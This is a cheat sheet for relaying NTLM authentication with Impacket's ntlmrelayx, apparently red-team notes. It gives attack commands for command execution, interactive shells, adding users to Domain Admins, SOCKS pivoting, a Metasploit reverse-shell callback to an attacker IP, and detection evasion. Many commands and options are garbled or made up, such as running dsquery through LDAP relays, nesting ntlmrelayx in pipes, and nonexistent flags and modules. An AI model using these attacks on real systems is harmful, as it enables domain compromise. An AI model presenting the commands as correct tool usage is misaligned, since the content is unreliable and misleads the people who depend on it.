# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

## Impacket-NTLMRelayX

`NTLMRelayX` is a powerful tool used for relaying NTLM authentication, primarily in Windows environments. It allows attackers to intercept and relay NTLM authentication attempts to other systems, potentially gaining unauthorized access. This ultimate edition of the cheat sheet covers all aspects of `NTLMRelayX` usage, detailed command examples, and advanced penetration testing techniques.

## Basic Syntax
```bash
ntlmrelayx.py [options]
```

## Core Options
- `-h, --help`: Show help message and exit.
- `-t TARGET`: Target host(s) to relay to. Can specify multiple targets using commas or by defining a range (e.g., `TARGET/24`).
- `-tf TARGETSFILE`: File containing a list of targets.
- `-c COMMAND`: Execute a command on the target.
- `-e EXECUTABLE`: Specify an executable to run on the target.
- `-i`: Interactive mode. Spawns an interactive shell on the target if the relayed authentication is successful.
- `-smb2support`: Enable SMB2 support.
- `-rpc-smb`: Enable relaying to RPC over SMB.
- `-socks`: Start a SOCKS proxy server after a successful relay, useful for pivoting.
- `-debug`: Enable debug output for detailed logging.

## Relay Scenarios
- **SMB to SMB**: Relays NTLM authentication from one SMB server to another.
- **HTTP to SMB**: Relays NTLM authentication from an HTTP server to an SMB server.
- **SMB to LDAP**: Relays NTLM authentication from an SMB server to an LDAP server, useful for Active Directory attacks.
- **HTTP to LDAP**: Relays NTLM authentication from an HTTP server to an LDAP server.

# Commands and Use Cases

#### SMB to SMB Relay
This is the most common use case for `NTLMRelayX`, where an NTLM authentication request received on SMB is relayed to another SMB server.

1. **Basic SMB to SMB Relay**: Relays NTLM authentication to `<target_ip>` and runs the `whoami` command on the target.
    ```bash
    ntlmrelayx.py -t <target_ip> -c "whoami"
    ```
2. **Relay to Multiple Targets**: Uses a list of targets (`targets.txt`) to relay authentication attempts, executing the `net user /domain` command on each target.
    ```bash
    ntlmrelayx.py -tf targets.txt -c "net user /domain"
    ```
3. **Interactive Shell via SMB Relay**: Relays authentication and attempts to spawn an interactive shell on the target.
    ```bash
    ntlmrelayx.py -t <target_ip> -i
    ```
4. **Relay with SMB2 Support**: Enables SMB2 support for relaying NTLM authentication to a target that supports SMB2, executing the `ipconfig` command.
    ```bash
    ntlmrelayx.py -t <target_ip> -smb2support -c "ipconfig"
    ```
5. **Relay with RPC over SMB**: Relays NTLM authentication over RPC to an SMB target, executing the `hostname` command.
    ```bash
    ntlmrelayx.py -t <target_ip> -rpc-smb -c "hostname"
    ```

#### HTTP to SMB Relay
This scenario involves relaying NTLM authentication from an HTTP server to an SMB server.

1. **Basic HTTP to SMB Relay**: Relays NTLM authentication from HTTP to an SMB target, executing the `dir` command.
    ```bash
    ntlmrelayx.py -t <smb_target_ip> -c "dir"
    ```
2. **Relay with Command Execution**: Relays NTLM authentication from HTTP and runs a specified executable on the SMB target.
    ```bash
    ntlmrelayx.py -t <smb_target_ip> -e /path/to/your/executable.exe
    ```
3. **Relay and Capture NTLM Hashes**: Relays NTLM authentication from HTTP to SMB, captures the NTLM hashes without executing any command on the target.
    ```bash
    ntlmrelayx.py -t <smb_target_ip> --no-execute -smb2support
    ```
4. **Relay with Socks Proxy for Pivoting**: Starts a SOCKS proxy after a successful relay, allowing for further pivoting into the network.
    ```bash
    ntlmrelayx.py -t <smb_target_ip> -socks
    ```
5. **Relay with Debugging Enabled**: Enables debug output for detailed logging during the relay process.
    ```bash
    ntlmrelayx.py -t <smb_target_ip> -debug
    ```

#### SMB to LDAP Relay
Relaying NTLM authentication from SMB to LDAP can be particularly useful in attacks targeting Active Directory environments.

1. **Basic SMB to LDAP Relay**: Relays NTLM authentication from SMB to an LDAP target, executing the `dsquery *` command to query the directory.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery *"
    ```
2. **Relay with User Enumeration**: Executes a `dsquery user` command on the LDAP target to enumerate users.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery user"
    ```
3. **Relay with Group Enumeration**: Enumerates groups on the LDAP target by relaying authentication and executing `dsquery group`.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery group"
    ```
4. **Modify LDAP Objects via Relay**: Adds a user to the Domain Admins group on the LDAP target by relaying NTLM authentication and modifying LDAP objects.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsmod group 'CN=Domain Admins,CN=Users,DC=domain,DC=com' -addmbr 'CN=NewUser,CN=Users,DC=domain,DC=com'"
    ```
5. **Relay to Execute Code on LDAP Target**: Uses the relay to execute a Metasploit resource script that targets LDAP for code execution.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "msfconsole -r ldap_exec.rc"
    ```

#### HTTP to LDAP Relay
Relaying NTLM authentication from HTTP to LDAP can be used to interact with directory services in a less conventional manner.

1. **Basic HTTP to LDAP Relay**: Relays NTLM authentication from HTTP to an LDAP target, querying the directory with `dsquery *`.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery *"
    ```
2. **Relay to Query LDAP for Specific Attributes**: Queries specific attributes (`cn` and `description`) from the LDAP directory after relaying authentication.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery * -attr cn description"
    ```
3. **Add Users to LDAP via Relay**: Adds a new user to the LDAP directory and makes them a member of the Domain Admins group.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsadd user 'CN=Hacker,CN=Users,DC=domain,DC=com' -pwd P@ssw0rd -memberof 'CN=Domain Admins,CN=Users,DC=domain,DC=com'"
    ```
4. **Relay to Create New LDAP Objects**: Creates a new organizational unit in the LDAP directory by relaying NTLM authentication.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsadd ou 'OU=NewOrgUnit,DC=domain,DC=com'"
    ```
5. **Exfiltrate LDAP Data via Relay**: Exfiltrates all attributes of a base object from the LDAP directory.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery * -scope base -attr *"
    ```

# Penetration Testing Techniques

#### Automated Relaying with Metasploit Integration
Integrating `NTLMRelayX` with Metasploit can automate certain attack paths, such as delivering payloads after a successful relay.

1. **Relay with Metasploit Payload Delivery**: Sets up Metasploit to deliver a reverse shell payload after relaying NTLM authentication.
    ```bash
    msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <attack_ip>; set LPORT <attack_port>; run -j"
    ntlmrelayx.py -t <target_ip> -c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f exe > reverse_shell.exe && reverse_shell.exe"
    ```
2. **Custom Metasploit Resource Script for NTLMRelayX**: Automates the NTLM relay process using a custom Metasploit resource script.
    ```cypher
    cat <<EOF > relay_script.rc
    use auxiliary/admin/smb/ntlmrelayx
    set TARGET <target_ip>
    set COMMAND "whoami"
    exploit
    EOF
    msfconsole -r relay_script.rc
	```

#### Chaining Relays for Complex Attack Paths
Relaying from one protocol to another and then pivoting through the network can create complex attack paths.

1. **SMB to LDAP to SMB Relay Chain**: Chains a relay from SMB to LDAP and then to another SMB target, executing `whoami` on the final target.
    ```bash
    ntlmrelayx.py -t ldap://<ldap_target_ip> -c "dsquery * -scope base -attr * | ntlmrelayx.py -t <smb_target_ip> -c 'whoami'"
    ```
2. **Relaying Through Multiple Network Segments**: Relays NTLM authentication across multiple network segments, allowing for deep network penetration.
    ```bash
    ntlmrelayx.py -tf targets_segment1.txt -c "echo Relayed to Segment 1 | ntlmrelayx.py -tf targets_segment2.txt -c 'echo Relayed to Segment 2'"
    ```
3. **Chained Relays with Conditional Logic**: Executes conditional commands based on the success of previous relays.
    ```bash
    ntlmrelayx.py -t <target_ip> -c "if [ `whoami` == 'Administrator' ]; then ntlmrelayx.py -t <admin_target_ip> -c 'net localgroup administrators'; fi"
    ```

#### Defense Evasion and Stealth Techniques

1. **Obfuscating NTLMRelayX Traffic**: Uses PowerShell's encoded command option to obfuscate the command being executed after a relay.
    ```bash
    ntlmrelayx.py -t <target_ip> -c "powershell -encodedCommand <encoded_command>"
    ```
2. **Timing Attacks with NTLMRelayX**: Delays execution of commands to avoid triggering security mechanisms that monitor for rapid connections.
    ```bash
    ntlmrelayx.py -t <target_ip> -c "ping -n 30 127.0.0.1 && whoami"
    ```
3. **Stealth Relaying with Traffic Shaping**: Adds artificial network delay to mimic legitimate traffic patterns during a relay attack.
    ```bash
    tc qdisc add dev eth0 root netem delay 100ms
    ntlmrelayx.py -t <target_ip> -c "whoami"
    ```
4. **Randomized Target Selection**: Randomizes the target selection to avoid detection by security analysts monitoring predictable attack patterns.
    ```bash
    shuf -n 1 targets.txt | xargs -I{} ntlmrelayx.py -t {} -c "ipconfig"
    ```
5. **Rotating Proxy Servers for Evasion**: Rotates between different proxy servers during the relay process to evade detection.
    ```bash
    ntlmrelayx.py -t <target_ip> --proxy-list proxy_servers.txt -c "hostname"
    ```

# Resources

|**Name**|**URL**|
|---|---|
|NTLMRelayX Documentation|https://github.com/SecureAuthCorp/impacket/blob/master/README.md|
|Impacket Toolkit (including NTLMRelayX)|https://github.com/SecureAuthCorp/impacket|
|Relaying NTLM Credentials|https://attack.mitre.org/techniques/T1207/|
|NTLMRelayX Tutorials|https://www.pentestpartners.com/security-blog/ntlm-relay-attacks-explained/|
|Using NTLMRelayX in Red Team Operations|https://ired.team/offensive-security-experiments/offensive-security-cheetsheets/ntlm-relay-attacks|
|Defensive Measures Against NTLM Relay Attacks|https://www.sans.org/white-papers/defending-against-ntlm-relay-attacks-39385/|
|NTLMRelayX and Active Directory Exploitation|https://posts.specterops.io/ntlm-relay-and-active-directory-abuse-8b358ea432b4|
|Advanced NTLMRelayX Techniques|https://www.offensive-security.com/metasploit-unleashed/ntlmrelayx/|
|NTLMRelayX in CTF Challenges|https://ctftime.org/writeups/overview/ntlmrelayx|
|NTLMRelayX for Pentesting and Beyond|https://www.hackingarticles.in/ntlm-relay-attacks-using-ntlmrelayx/|